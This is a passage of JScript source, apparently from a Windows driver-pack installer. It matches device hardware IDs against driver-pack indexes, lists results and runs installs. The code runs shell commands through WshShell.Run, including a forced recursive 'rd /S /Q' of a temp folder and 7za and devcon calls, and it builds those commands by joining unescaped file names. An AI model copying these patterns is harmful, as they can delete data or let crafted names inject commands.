		   else if (pack_name_lc.indexOf("lan_realtek") != -1) { pack_desc = synonym_lan_realtek; pack_icon = "9"; }
		   else if (pack_name_lc.indexOf("lan") != -1) { pack_desc = synonym_lan; pack_icon = "9"; }
		}

		var dev_db = "";
		var matchfound = false;
		var db_isfound = false;
		var dev_id = "";
		var dev_dir = "";
		var dev_name = "";
		var dev_status = "";
		var scheduleindexing = false;

		var pack_folder_ID = pack_folder.replace(/(...)?drp\\/i,"").replace(/[ \\]/g,'_');
		// Check if the driverpack has an index file
		if (!fso.FileExists(devIDFolder + "\\" + pack_name + "_" + pack_folder_ID + ".txt")||
			!fso.FileExists(devIDFolder + "\\" + pack_name + "_" + pack_folder_ID + ".hash")){
			scheduleindexing = true;
		} else {
			// This call initializes variables which are used by isCompatible later
			checkOSArh(pack_name);
			//reset_timer("Parse index");
			db_isfound = true;
			table_score = [];
			table_dir = [];
			table_inf = [];
			table_arh = [];
			table_cat = [];
			table_ver = [];
			table_desc = [];
			hashfile = fso.OpenTextFile(devIDFolder + "\\" + pack_name + "_" + pack_folder_ID + ".hash", 1, false);
			hashdata=hashfile.ReadAll();
			numbuckets = get_val_i(0);
			hashfile.Close();

			indexfile = fso.OpenTextFile(devIDFolder + "\\" + pack_name + "_" + pack_folder_ID + ".txt", 1, false);
			indexdata=indexfile.ReadAll();

/*      	  finisher_load(
				pack_name, // pack
				devIDFolder + "\\" + pack_name + ".ini", // ini
				temp + "\\drp\\" + pack_name + "\\drp"); // temp
*/
			/*    lines = indexdata.split('\n');
				for (i = 1;i<lines.length-1;i++){
					var entry = lines[i].split('\t');
					key = entry[0].toUpperCase();
					hashval = get_hash_value(key);
					hashval = hashval % numbuckets;
					slen = get_val_i(2+hashval*2);
					spos = get_val_i(1+hashval*2);
					var fn = 0;
					lines1 = indexdata.substr(spos,slen).split('\n');
					for (k = 0;k<lines1.length-1;k++){
						var entry = lines1[k].split('\t');
						if (entry[0].toUpperCase()==key) fn+=1;
					}
					if (fn==0) log(key+"*found "+fn);
				}*/
			indexfile.Close();
			var i = 0;
			var lasti = 0;
			var lastg = -1;
			var searchid
			var datecmp;
			var indiv = [];
			var loaded = [];
			var bytes_read = 0;
			if (indexdata.substr(0,9).indexOf("Version5;") == -1)
				scheduleindexing = true;
			else
			for (var i = 0; i < dev_IDs.length; i++) {
				searchid=dev_IDs[i].toUpperCase();
				var foundid = false;
				hashval = dev_hashval[i];
				hashval = hashval % numbuckets;
				if(!loaded[hashval]){
					loaded[hashval] = 1;
					slen = get_val_i(2+hashval*2);
					if (slen){
						bytes_read += slen;
						spos = get_val_i(1+hashval*2);
						lines = indexdata.substr(spos,slen).split('\n');
						for (k = 0;k<lines.length-1;k++){
							var entry = lines[k].split('\t');
							key = entry[0].toUpperCase();
						if (!table_score[key])table_score[key] = 0;
							var comp = isCompatible(entry[3].toUpperCase(),entry[1].toUpperCase());
/*      					  if (comp<3)
							{
							log("^Incompatible");
							log("^  "+comp);
							log("^  "+key);
							log("^  "+entry[1]);
							log("^  "+entry[2]);
							log("^  "+entry[3]);
							log("^  "+entry[4]);
							log("^  "+entry[5]);
							}*/
//      					  if (comp > table_score[key]){
							if (comp > 2){
								var n = 0;
								while (table_score["" + n + key] != null)n++;
								key = "" + n + key;
								table_score[key] = comp;
								table_dir[key] = entry[1];
								table_inf[key] = entry[2];
								table_arh[key] = entry[3];
								table_cat[key] = entry[4];
								if(table_cat[key]==1&&table_score[key]>2)table_score[key]+=20;
								table_ver[key] = entry[5];
								table_desc[key] = entry[6];
		if(!compatibleDrvWithNotebook(table_dir[key]))table_score[key]=0;
/*      						  log();
								log(entry[0]);
								log("Score: "+table_score[key]);
								log("dir: "+entry[1]);
								log("sign: "+table_cat[key]);*/
							}
						}
					}
				}
				var dev_hint;
				var id_hint;

				var bestscore = 2;
				var bestver = table_instver[searchid];
				var bestcat = 0;
				var bestid = null;
				var bestn =null;

				var bestind = (dev_inst_ind[i]!=null)?dev_inst_ind[i]:99;
				for (n=0;table_dir["" + n + searchid];n++)
				if (table_score["" + n + searchid]>=bestscore)
				if (bestind>=dev_ind[i])
				{
					matchfound = true;
					foundid = true;
					dev_id = searchid;
					id_hint = dev_id;
					key = "" + n + dev_id;
					dev_dir = table_dir[key];
					dev_status = dev_curstatus[i];
					dev_sect = table_arh[key];
					dev_inf = table_inf[key];
					dev_ver = table_ver[key];
					dev_cat = table_cat[key];
					score = table_score[key];

					if (!table_instver[dev_id])  table_instver[dev_id]  = "none";
					if (!table_instinf[dev_id])  table_instinf[dev_id]  = "none";
					if (!table_instsect[dev_id]) table_instsect[dev_id] = "none";

					dev_name = table_desc[key].replace(/\r/,'');

					dev_hint =
						//dev_name + "\r\n\r\n\r\n" +
						//"<b>"+dev_hint_availableDrv+"</b><br>" +
						dev_hint_version+": " + table_ver[key] + "<br>" +
						dev_hint_inf+": " + table_dir[key] + table_inf[key] + "<br>" +
						dev_hint_section+": " + table_arh[key] + "<br>" +
						"<br>" +
						"<b>"+dev_hint_curDrv+"</b>" + "<br>" +
						dev_hint_version+": " + table_instver[dev_id] + "<br>" +
						dev_hint_inf+": " + table_instinf[dev_id] + "<br>" +
						dev_hint_section+": " + table_instsect[dev_id] + "<br>" +
						"<br><b>";
					if(table_ver[key]=="Unknown") datecmp = -1;else
					datecmp = isNewerThan(table_ver[key],bestver);
					if ((datecmp >= 0||(bestcat==0&&table_cat[key]==1))||bestid==null)
					{
						bestver = table_ver[key];
						bestscore = table_score[key];
						bestcat = table_cat[key];
						bestid = dev_id;
						bestn = n;
						bestdev_name = dev_name;
						bestdev_hint = dev_hint;

						bestind = dev_ind[i];
					}


//      			  finisher_run(pack_name,table_dir[key],table_inf[key],dev_id);
				}
				var dev_hint ="";
				if (lastg != dev_group[i]){
					lastg = dev_group[i];
					lasti = i;
				}
				if(bestid!=null)
				{
					dev_id = bestid;
					id_hint = dev_id;
					key = "" + bestn + dev_id;
					dev_dir = table_dir[key];
					dev_status = dev_curstatus[i];
					dev_inst_ind1 = dev_inst_ind[i];
					dev_sect = table_arh[key];
					dev_inf = table_inf[key];
					dev_ver = table_ver[key];
					score = table_score[key];

					if (!table_instver[dev_id])  table_instver[dev_id]  = "none";
					if (!table_instinf[dev_id])  table_instinf[dev_id]  = "none";
					if (!table_instsect[dev_id]) table_instsect[dev_id] = "none";

					dev_name = bestdev_name;
					dev_hint = bestdev_hint;

					log();
					log("MatchFound");
					dev_hint =
						//dev_name + "\r\n\r\n\r\n" +
						//"<b>"+dev_hint_availableDrv+"</b>\r\n" +
						dev_hint_version+": " + table_ver[key] + "<br>" +
						dev_hint_inf+": " + table_dir[key] + table_inf[key] + "<br>" +
						dev_hint_section+": " + table_arh[key] + "<br>" +
						"<br>" +
						"<b>"+dev_hint_curDrv+"</b>" + "<br>" +
						dev_hint_version+": " + table_instver[dev_id]+" "+ table_instvr[dev_id] + "<br>" +
						dev_hint_inf+": " + table_instinf[dev_id] + "<br>" +
						dev_hint_section+": " + table_instsect[dev_id] + "<br>" +
						"<br><b>";
					log("##Pack:#####"+pack_folder+"\\"+pack_name);
					log("##Device:###"+dev_name);
					log("##Score:####"+table_score[key]);
					log("##Sign:#####"+table_cat[key]);
					log("##ThisHWID:#"+dev_id+" ["+dev_ind[i]+"]");
					log("##ThisVer:##"+table_ver[key]);
					log("##ThisInf:##"+table_dir[key]+table_inf[key]);
					log("##ThisSect:#"+table_arh[key]);
					log("##InstHWID:#"+dev_IDs[lasti+dev_inst_ind1]+" ["+dev_inst_ind1+"]");
					log("##InstVer:##"+table_instver[dev_id]);
					log("##InstInf:##"+table_instinf[dev_id]);
					log("##InstSect:#"+table_instsect[dev_id]);
					if(dev_inst_ind[i]>dev_ind[i])log("##Rank:#####Better");
					if(dev_inst_ind[i]<dev_ind[i])log("##Rank:#####Worse");
					if(dev_inst_ind[i]==dev_ind[i])log("##Rank:#####Same");


					if(table_ver[key]=="Unknown") datecmp = 0;else
					datecmp = isNewerThan(table_ver[key],table_instver[dev_id]);
					var resol;
					if (datecmp == 0) { resol = "Driver is up to date"; resol_hint = dev_hint_drvUp; }
					if (datecmp  < 0) { resol = "Installed driver is better then this one"; resol_hint = dev_hint_drvBetter; }
					if (datecmp  > 0) { resol = "Driver can be updated"; resol_hint = dev_hint_drvCanUpd; }
					log("##Verdict:##" + resol);
					dev_hint += resol_hint + "</b>";
				}

				if (foundid){
					var t = dev_group[i];
					var this_i = i;
					i = lasti;
					id_hint = "";
					log("##Other HWIDs");
					while(i < dev_IDs.length && dev_group[i] == t){
						if (matchfound) dev_found[i] = true;
						id_hint += (i==this_i?"<b>"+dev_IDs[i]+"</b>":dev_IDs[i])+"\r\n";
						log("####"+dev_IDs[i]);
						i++;
					}
					i--;
					log();
				}
				// Short device name
				dev_shortname = dev_name;

				if (matchfound) {
					matchfound = false;
					if (dev_status.indexOf("DEVICE HAS A PROBLEM") != -1 || dev_inst_ind1=="undefined") {
						if (compatibleDrvWithNotebook(dev_dir)) {
							if (showPackNames && indiv["driver_available"] == null)
								doc_innerHTML["driver_available"] += "<font color=\"Blue\" size='2'>" +
								pack_folder.replace(/(...)?drp\\/i,"")+"\\"+pack_name+"</font>";
							indiv["driver_available"] = 1;
							
							add_button(
								"driver_available",
								pack_icon,pack_folder,pack_name,pack_desc,
								dev_name,dev_hint,dev_id,dev_ver,id_hint,dev_status,dev_dir,
								dev_inf,
								false);
						}
					}
					else {
						var nm;
						if (datecmp == 0) nm = "driver_uptodate";
						if (datecmp  < 0) nm = "driver_old";
						if (datecmp  > 0) nm = "driver_new";
						
						//DEBUG !!!
						//nm = "driver_new";
						
						if ((nm != "driver_new") || (compatibleDrvWithNotebook(dev_dir))){
							if (showPackNames && indiv[nm] == null)
								doc_innerHTML[nm] += "<font color=\"Blue\" size='2'>" +
								pack_folder.replace(/(...)?drp\\/i,"")+"\\"+pack_name+"</font>";
							indiv[nm] = 1;
						
							add_button(
								nm,
								pack_icon,pack_folder,pack_name,pack_desc,
								dev_name,dev_hint,dev_id,dev_ver,id_hint,dev_status,dev_dir,
								dev_inf,
								false);
						}
					}
				}
			}
			log(bytes_read + " bytes actually read from " + devIDFolder + "\\" + pack_name  + "_" + pack_folder_ID + ".txt");
			total_bytes_read += bytes_read;
			//timer_new("timer_scaned_index ");
		}
		var path = pack_folder.replace(/(...)?drp\\/i,"") + "\\" + pack_name;
//        checkOSArh(pack_name);
//        log((pack_is64?'x64':'x86')+' '+(pack_winver)+' '+pack_folder+'\\'+pack_name);
		add_button(
			"driverpacks",
			db_isfound?pack_icon:"no_db",pack_folder,pack_name,pack_desc,
			path,path,"","","","","",
			"",
			scheduleindexing);
	}
	
	var timedProcessCount=0;
	function timedProcessArray(items, process, callback) {
		var todo = items.concat();   //create a clone of the original
		timedProcessCount++;
		
		setTimeout(function () {
			var start = +new Date();
			do {
				var params = todo.shift();
				var param1 = params.split('||')[0];
				var param2 = params.split('||')[1];
				process(param1,param2);
			} while (todo.length > 0 && (+new Date() - start < 50));
			if (todo.length > 0){
				setTimeout(arguments.callee, 100);
			} else {
				timedProcessCount--;
				callback(items);
			}
		}, 25);
	}


	

	// Scan indexes
	function scan_indexes(folder) {
		lf('scan_indexes');
		var f = fso.GetFolder(folder);
		var fc = new Enumerator(f.Files);
		var dc = new Enumerator(f.SubFolders);
		var files = 0;

		// Go through all driverpacks from the drpFolder
		for (;!dc.atEnd(); dc.moveNext()){
/*      	  if (dc.item().name.indexOf("unpacked") != -1)
				{load_indexes(folder,dc.item().name);files++;}
			else*/
				files += scan_indexes(folder+'\\'+dc.item().name);
		}
		
		var tasks = [];
		for (fc.moveFirst();!fc.atEnd();fc.moveNext()) {
			pack_name = fc.item().name;
			if ((!pack_name.match(/#dp_finish.7z/i)) && (pack_name.match(/.7z/i))){
				//load_indexes(folder,pack_name);
				tasks[tasks.length] = folder+'||'+pack_name;
			}
			
		}
		if (tasks.length == 0) { return false; }

		timedProcessArray(tasks, load_indexes, onPackLoadingComplite);

		return files + f.Files.count;
	}

	function getdrivetype(ID) {
		switch(ID) {
			case 0: return "unknown";
			case 1: return "removable";
			case 2: return "fixed";
			case 3: return "network";
			case 4: return "CD-ROM";
			case 5: return "RAM Disk";
			default: return "[value="+ID+"]";
		}
	}

	// Main
	var DRPgood = true;
	function main() {
		lf('main');
		// Clear all buttons
		buttonCount = 0;

		// Try loading local DRP
		if (!fso.FolderExists(drpFolder)) {
			try {
				fso.CreateFolder(drpFolder);
				if (!fso.FolderExists(drpFolder)) {
					DRPgood = false;
					log("Failed to create "+drpFolder);
					alert(alert_notFolder);
				}
			}
			catch(e) {
				DRPgood = false;
				log("Failed to create "+drpFolder+" (expection)");
				alert(alert_notFolder);
			}
		}
		log("DRP: "+drpFolder);

		total_bytes_read = 0;
		action_list = [];

		// If everething is fine by now, use local DRP
		if (DRPgood && !scan_indexes(drpFolder)) {
			DRPgood = false;

			var myObject = new Object();
			myObject.lang = lang;
			if ( typeof builderObj == 'undefined' )
				$('a#builder').click();
			//showModelessDialog("tools/modules/firstRunHelp.htm",myObject,"status:false;dialogWidth:540px;dialogHeight:325px;scroll:no;");

			//setTimeout('infobar_drvNone()',1000);
		}

		// If failed local DRP
		if (!DRPgood) {
			if (drpFolder.indexOf(":") == -1) {  // if we don't use alternative DRP
				var abc = "CDEFGHIJKLMNOPQRSTUVWXYZ[";
				log("Looking for X:\\DRP");
				for (i = 0; i < 22 ; i++) {
					var di= abc.substr(i,1);
					try {
						var drive = fso.GetDrive(fso.GetDriveName(di+':'));
						log(di + ": " + getdrivetype(drive.DriveType) + (drive.IsReady?" is ready":" is NOT ready"));
						if (drive.DriveType>0 && drive.IsReady && fso.FolderExists(drive+"\\"+drpFolder))
						drpFolder = drive+"\\"+drpFolder;
					}
					catch(e) {}
				}
				if (drpFolder.indexOf(":") != -1) {
					log("DRP: "+drpFolder);
					if(!scan_indexes(drpFolder)) {
						log("Failed to find alernative driverpacks");
						//alert(alert_folderEmpty);
					}
				} else {
					log("Failed to find alernative driverpack folder");
					//alert(alert_folderEmpty);
				}
			} else {
				log("Failed: DRP wen offline");
				//alert(alert_folderEmpty);
			}
			onPackLoadingComplite();
		}
		
	}
	
	
	
	function addDeviceButtons(){
		log(total_bytes_read + " bytes actually read in total");
		timer_new("Timer_Index_complite ");
		// Add device buttons for unknown devices
		log();
		for (var i = 0; i < dev_IDs.length; i++) {
			if (dev_found[i]) {log("Found_skip " + dev_IDs[i]); continue;}

			if (dev_curstatus[i].indexOf("DEVICE HAS A PROBLEM") != -1 || dev_inst_ind[i]=="undefined") {
				log("NotInstalled");
				log("##Name:###" + dev_devname[i]);
				log("##HWID:###" + dev_IDs[i]);
				log("##Manuf:##" + dev_manuf[i]);
				log("##Status:#" + dev_curstatus[i]);
				log();
				add_button(
					"no_driver",
					"0","","",drv_notKnown,
					dev_devname[i],dev_devname[i],dev_IDs[i],"",dev_IDs[i],dev_curstatus[i],"",
					"",
					false);
				if (infobar_urls) infobar_urls+="";
				//infobar_urls+="<a href='#' class='infobar_urls' onclick=\"return goToUrl('http://devid.drp.su/?dev="+escape(dev_IDs[i])+"','','');\">"+dev_IDs[i]+"</a>";
				infobar_urls+="<button class='infobar_urls_button' onclick=\"return goToUrl('http://devid.drp.su/?dev="+escape(dev_IDs[i])+"','','');\" title="+dev_IDs[i]+">"+infobar_urlsClean(dev_IDs[i])+"</button>";
			} else {
				log("MatchNotFound");
				log("##Name:###" + dev_devname[i]);
				log("##HWID:###" + dev_IDs[i]);
				log("##Manuf:##" + dev_manuf[i]);
				log("##Provid:#" + dev_provider[i]);
				log("##Status:#" + dev_curstatus[i]);
				log();

				add_button(
					dev_provider[i]=="Microsoft"?"driver_standard":"driver_unknown",
					"0","","",drv_notKnown,
					dev_devname[i],dev_devname[i],dev_IDs[i],"",dev_IDs[i],dev_curstatus[i],"",
					"",
					false);
			}
			for(t=dev_group[i];i<dev_IDs.length && dev_group[i]==t;i++);
			i--;
		}
		timer_new("Timer_drivers_scaned ");
		log("Groups");
		for(i in doc_innerHTML){
			document.getElementById(i).innerHTML = doc_innerHTML[i];
			document.getElementById(i+"_num").innerHTML = doc_num[i];
			log("##" + i + ":#" + doc_num[i]);
		}
		log();

	}

	// Vista hack

	document.body.style.cursor="auto";
	//if (!(OSVersion >= 6 && OSVersion != 6.2 && dpa.commandLine.indexOf('Run') == "-1")){
		//ToDo: In IE10 is not possible to get the command line, so you need to do through WMI. And do not check the condition on Windows to version IE.
		//window.attachEvent('onload',function () {
			refresh();
		var logFolder = WshShell.ExpandEnvironmentStrings("%WinDir%\\Logs\\DRPLog\\");
		var ScreenShotCopy = "Tools\\modules\\bugreport\\copyoldlogs.bat"
		var ScreenShotDRP = "Tools\\modules\\bugreport\\boxcutter.exe -f " + WshShell.ExpandEnvironmentStrings("%TEMP%\\DRP.png");
		var ScreenShotDPS = "Tools\\modules\\bugreport\\boxcutter.exe -f " + WshShell.ExpandEnvironmentStrings("%TEMP%\\DPS.png");
		//});
	//}

	function startpoint() {
		if (GetChkCount()&&
			confirm(alert_askIndexing)){
			instType_all = 5;
			//for(i in doc_innerHTML)
			//	document.getElementById(i+'_list').style.display='none';

			//document.getElementById('driverpacks_list').style.display='block';
			//document.getElementById('driverpacks_div').style.display='block';
			run_button(false);
			refresh_perform_task();
		}else
		{
			if(GetChkCount())unChkAll();
		}
		instType_all = 1;
	}

	function show_dpinst_results(ret) {
		log("DPInst_result "+ret);
		var v1 =   ret     &0xFF;
		var v2 =  (ret>> 8)&0xFF;
		var v3 =  (ret>>16)&0xFF;
		var v4 = ((ret>>24)&0x80)?"Yes":"No";
		var v5 = ((ret>>24)&0x40)?"Yes":"No";
		log("##Installed:#####"+v1);
		log("##Preinstalled:##"+v2);
		log("##Not installed:#"+v3);
		log("##Failed:########"+v4);
		log("##Need reboot:###"+v5);
	}

	// show_task
	function show_task(but_id,install_mode) {
		lf('show_task');
		log("perform_task("+but_id+");");
		log("##Pack:####"+button_pack_folder[but_id]+"\\"+button_pack_name[but_id]);
		log("##Group:###"+button_div[but_id]);
		log("##Mode:####"+install_mode);
		log("##Name:####"+button_dev_name[but_id]);
		log("##HWID:####"+button_dev_id[but_id]);
		log("##Inf:#####"+button_dev_dir[but_id]+button_dev_inf[but_id]);
		log("##Version:#"+button_dev_ver[but_id]);
		log("##Status:##"+button_dev_status[but_id]);
	}

	// finisher
	var action_list = [];
	function finisher_load(pack_name,filename,temp) {
		lf('finisher_load');
		if (fso.FileExists(filename)) {
			var cur_sect = null;
			var rootDir;

			var curact = 0;

			var tempfile = fso.OpenTextFile(filename, 1, false);
			var ini = tempfile.ReadAll();
			tempfile.Close();

			log("Parsing "+filename);
			action_list[pack_name.toLowerCase()] = 1;
			var re = new RegExp("\\s*(?:\\[([^\\]]+)]\\s*|(\\S+)\\s*=\\s*(?:\")?([^\r\n\"]*)(?:\")?|(;).*)[\r\n]","mg");
			while (result = re.exec(ini)) {
				if (RegExp.$4) continue;

				if (RegExp.$1) {
					cur_sect = RegExp.$1.toLowerCase();
					continue;
				}
				if (!cur_sect) {
					log("**3 Unknown section");
					continue;
				}
				if (!RegExp.$2) {
					log("**4 Expected option");
					continue;
				}
				if (!RegExp.$3) {
					log("**5 Expected value for " + RegExp.$2);
					continue;
				}
				var opt = RegExp.$2.toLowerCase();
				var val = RegExp.$3;
				if (cur_sect == "driverpack") {
					if (opt=="rootdir") {
						if (val.charAt(val.length-1) != '\\') val += "\\";
						rootDir = val.toLowerCase();
						exc_count = 0;
					}
					continue;
				} else {
					val = val.replace(/%SystemDrive%\\devcon\.exe/,"tools\\devcon.exe");
					val = val.replace(/%WINDIR%/ig,env_windir);
					val = val.replace(/%SystemRoot%/ig,env_SystemRoot);
					val = val.replace(/%SystemDrive%/ig,env_SystemDrive);
					val = val.replace(/%DPSROOT%/ig,temp);
					val = val.replace(/%DPSTMP%/ig,temp);
					if (cur_sect.charAt(cur_sect.length-1) != '\\') cur_sect += "\\";
					action_list[pack_name.toLowerCase()+"_"+rootDir+cur_sect+"_"+opt] = val;
					continue;
				}
			}
//      	  for(i in action_list)
//      		  log(i + "=" + action_list[i]);
		}
	}

	// finisher_run
	function finisher_run(pack_name,dev_dir,inf,HWID) {
		lf('finisher_run');
		if (!action_list[pack_name.toLowerCase()]) {
			log("No fisnish file");
			return;
		}
		inf = temp + "\\" + inf;
		inf = inf.toUpperCase();
		log("finisher_run(" + pack_name+","+dev_dir+","+inf+","+HWID+");");

		var current = pack_name.toLowerCase()+"_"+dev_dir.toLowerCase()+"_";
		var exc_count = parseInt(action_list[current + "exc_count"]);
		if (!exc_count) {
			log("No commands for this dir");
			return;
		}
		log("exc_count=" + exc_count);

		if (!exc_count) return;
		for (i=1;i<exc_count+1;i++) {
			var current1 = current + "exc_" + i +"_";
			var exc_x_tagFiles = parseInt(action_list[current1 + "tagfiles"]);
			var match = true;
			log(current1 + "tagFiles=" + exc_x_tagFiles);
			for (it=1;it<exc_x_tagFiles+1;it++) {
				var exc_x_tagFile = action_list[current1 + "tagfile" + it];
				log(current1 + "tagFile" + it + "=" + exc_x_tagFile);
				if(!fso.FileExists(exc_x_tagFile)) {
					log("NotExist");
					match = false;
				}
			}
//      	  if (!match) continue;

			var exc_x_tagpHWIDS = parseInt(action_list[current1 + "+hwids"]);
			log(current1 + "+hwids=" + exc_x_tagpHWIDS);
			if (exc_x_tagpHWIDS)
			{
				match = false;
				for (it=1;it<exc_x_tagpHWIDS+1;it++) {
					var exc_x_tagpHWID = action_list[current1 + "+hwid" + it];
					log(current1 + "+hwid" + it + "=" + exc_x_tagpHWID);
				}
			}

			var exc_x_tagmHWIDS = parseInt(action_list[current1 + "-hwids"]);
			log(current1 + "-hwids=" + exc_x_tagmHWIDS);
			if (exc_x_tagmHWIDS) {
				for (it=1;it<exc_x_tagmHWIDS+1;it++) {
					var exc_x_tagmHWID = action_list[current1 + "-hwid" + it];
					log(current1 + "-hwid" + it + "=" + exc_x_tagmHWID);
				}
			}

			var exc_x_tagpInfs = parseInt(action_list[current1 + "+inffiles"]);
			log(current1 + "+inffiles=" + exc_x_tagpInfs);
			if (exc_x_tagpInfs) {
				for (it=1;it<exc_x_tagpInfs+1;it++) {
					var exc_x_tagpInf = action_list[current1 + "+inffile" + it];
					log(current1 + "+inffile" + it + "=" + exc_x_tagpInf);
				}
			}

			var exc_x_tagmInfs = parseInt(action_list[current1 + "-inffiles"]);
			log(current1 + "-inffiles=" + exc_x_tagmInfs);
			if (exc_x_tagmInfs) {
				for (it=1;it<exc_x_tagmInfs+1;it++) {
					var exc_x_tagmInf = action_list[current1 + "-inffile" + it];
					log(current1 + "-inffile" + it + "=" + exc_x_tagmInf);
				}
			}

			var exc_x_tagCommands = parseInt(action_list[current1 + "commands"]);
			log(current1 + "commands=" + exc_x_tagCommands);
			for (it=1;it<exc_x_tagCommands+1;it++) {
				var exc_x_tagCommand = action_list[current1 + "command" + it];
				log(current1 + "command" + it + "=" + exc_x_tagCommand);
			}
		}
	}

	function renamefile(name1,name2) {
		log(name1+" | "+name2);
		if (fso.FileExists(name2)) fso.getfile(name2).Delete();
		if (fso.FileExists(name1)) fso.MoveFile(name1,name2);
	}

	// perform_task
	var noRefresh   = false;
	var installErrors=[];
	function perform_task(but_id,install_mode) {
		lf('perform_task');
		var buttonid = "Button_" + but_id;
		var pack_folder = button_pack_folder[but_id];
		var pack_name   = button_pack_name[but_id];
		var dev_dir     = button_dev_dir[but_id];
		var dev_inf     = button_dev_inf[but_id];
		var dev_id     = button_dev_id[but_id];

		show_task(but_id,install_mode);

		// 1) Smart installation
		if (install_mode == 1 && dev_dir && dev_dir != "undefined") {
			reset_timer("Start driver instalation");
			lastImg = document.getElementById(buttonid).src;
			document.getElementById(buttonid).src = './tools/indicator3.gif';

			var t = button_pack_folder[but_id] + button_pack_name[but_id];
			log("Dirs: " + pack_dirs[t]);

			//if (!pack_dirs[t]) pack_dirs[t] = dev_dir;
			pack_dirs[t] = pack_dirs[t].replace(/\|/ig,"\" \"");

			var ret = 0;
			if (pack_dirs[t]!="" && pack_name.indexOf("unpacked") == -1) {
				WshShell.Run("cmd /C rd /S /Q \""+temp+"\\drp\\"+pack_name+"\"",0,true);
				var unpack_str = "tools\\7za.exe x -yo" +
					"\"" + temp + "\\drp\\" + pack_name + "\\drp\" " +
					"\"" + pack_folder + "\\" + pack_name +".7z\"" + " " +
					"\"" + pack_dirs[t] + "\"";

				log(pack_dirs[t]+"  "+dev_dir);
				log(unpack_str);
				ret = WshShell.Run(unpack_str,0,true);
				log("Return: " + ret);
			}

			var ret1 = 0;
			var lang_pack = pack_name.replace(/_[a-c]_/i,"_Languages_");
			if (pack_name.indexOf("_Languages_") != -1 && fso.FileExists(pack_folder + "\\" + pack_name+".7z")) {
				var unpack_str = "tools\\7za.exe x -yo" +
					"\"" + temp + "\\drp\\" + pack_name + "\\drp\" " +
					"\"" + pack_folder + "\\" + lang_pack +".7z\"" + " " +
					"\"" + pack_dirs[t] + "\"";

				log(unpack_str);
				ret1 = WshShell.Run(unpack_str,0,true);
				log("Return: " + ret1);
			}

			pack_dirs[t] = "";
			if (ret == 0 && ret1==0) // if no error at all
			{
				var arg = "";
				var WaitOnReturn = true;
				if (silentInstall) {
					arg += "/SW ";
//      			  WaitOnReturn = true;
				} else {
					WaitOnReturn = false;
					noRefresh = true;
				}
				WaitOnReturn = true;

				var act_str = "tools\\"+devcon+" update " +
					"\"" + temp + "\\drp\\" + pack_name + "\\drp\\" + dev_dir +dev_inf+"\" \""+dev_id+"\"";
/*      		  if (pack_name.indexOf("unpacked") != -1)
					act_str = "tools\\" + dpinst + " " + arg + "/PATH " +
					"\"" + current_dir + pack_folder + "\\" + pack_name + "\\" + dev_dir;*/
				log(act_str);
				ret = WshShell.Run(act_str,0,WaitOnReturn);
				log("Ret: "+ret);
				switch(ret)
				{
					case 0:
						//alert(manual_alert_instSuccess);
						document.getElementById(buttonid).src = "./tools/green_ok.png";
						break;
					case 1:
						//alert(manual_alert_instSuccessRestart);
						document.getElementById(buttonid).src = "./tools/ok.png";
						need_reboot=true;
						break;
					default:
						//alert(manual_alert_notSuccess);
						document.getElementById(buttonid).src = "./tools/no.png";
						document.getElementById("message").style.display = "block";
						setTimeout('document.getElementById("message").style.display = "none";',10000);
				}

//      		  finisher_load(pack_folder + "\\" + lang_pack + ".ini",temp);
			} 
			else 
			{
				document.getElementById(buttonid).src = "./tools/no.png";
				installErrors.push(pack_name);
			}

			if (silentInstall) { instRunCount--; ChangeChkCount(-1); }
			else { instRunCount = 0; noRefresh = true; }
//      	  WshShell.Run("cmd /C rd /S /Q \""+temp+"\\drp\\"+pack_name+"\"",0,true);
			timer("Done ");
		} // 5) Create index
		else if (install_mode == 5) {
			reset_timer("Start indexing");
			document.getElementById(buttonid).src = './tools/indicator3.gif';

			var act_str = "tools\\DEVParser\\start.cmd " + pack_name + " " +
				"\"" + pack_folder + "\\" + pack_name + ".7z\" " +
				devIDFolder;

/*      	  if(pack_name.indexOf("unpacked") != -1) {
				act_str = "tools\\DEVParser\\start_u.cmd " + pack_name + " " +
				"\"" + pack_folder + "\\" + pack_name + "\" " +
				devIDFolder;
			}*/
			log(act_str);
			WshShell.Run(act_str,0,true);
			var pack_folder_ID = pack_folder.replace(/(...)?drp\\/i,"").replace(/[ \\]/g,'_');

			renamefile(devIDFolder + "\\" + pack_name + ".txt",
					   devIDFolder + "\\" + pack_name + "_" + pack_folder_ID + ".txt");
			renamefile(devIDFolder + "\\" + pack_name + ".hash",
					   devIDFolder + "\\" + pack_name + "_" + pack_folder_ID + ".hash");
			renamefile(devIDFolder + "\\" + pack_name + ".ini",
					   devIDFolder + "\\" + pack_name + "_" + pack_folder_ID + ".ini");

			document.getElementById(buttonid).src = './tools/ok.png';
			instRunCount--;
			ChangeChkCount(-1);
			timer("Done ");
		} // 6) Skipping
		else if (install_mode == 6 && dev_dir && dev_dir != "undefined") {
			document.getElementById(buttonid).src = "./tools/ok.png";
			instRunCount--;
			ChangeChkCount(-1);
		} // 4) Manual installion
		else if (install_mode == 4 && dev_dir && dev_dir != "undefined") {
			var myObject = new Object();
			myObject.file = pack_name;
			myObject.HWIDS = HWIDS;
			myObject.dev_dir = dev_dir;
			myObject.dev_name = button_dev_name[but_id];
			myObject.dev_id = button_dev_id[but_id];
			myObject.dev_status = button_dev_status[but_id];
			myObject.drpFolder = pack_folder;
			myObject.lang = lang;
			myObject.devcon = devcon;

			log("Manual installation");
			log("file:#######"+pack_name);
			log("HWIDS:######"+HWIDS);
			log("dev_dir:####"+dev_dir);
			log("dev_name:###"+myObject.dev_name);
			log("dev_id:#####"+myObject.dev_id);
			log("dev_status:#"+myObject.dev_status);
			log("drpFolder:##"+myObject.drpFolder);
			log("lang:#######"+myObject.lang);
			log("devcon:#####"+myObject.devcon);
			showModelessDialog("tools/drv_update.hta",myObject,"status:false;dialogWidth:400px;dialogHeight:185px;scroll:no;");
			noRefresh = true;
			log("Done ");
		} // Unpack and install
		else if (install_mode == 1) {
			alert(alert_removedfeature);
/*      	  reset_timer("Start full unpacking and installing");
			document.getElementById(buttonid).src = './tools/indicator3.gif';

			if(pack_name.indexOf("unpacked") == -1) {
				WshShell.Run("cmd /C rd /S /Q \""+temp+"\\drp\\"+pack_name+"\"",0,true);
				var unpack_str = "tools\\7za.exe x -yo" +
					"\"" + temp + "\\drp\\" + pack_name + "\\drp\" " +
					"\"" + pack_folder + "\\" + pack_name+".7z\"";
				log(unpack_str);
				WshShell.Run(unpack_str,0,true);
			}

			delete_dpinst_log();
			var act_str = "tools\\" + dpinst + " /PATH " +
				"\"" + temp + "\\drp\\" + pack_name;
			if(pack_name.indexOf("unpacked") != -1)
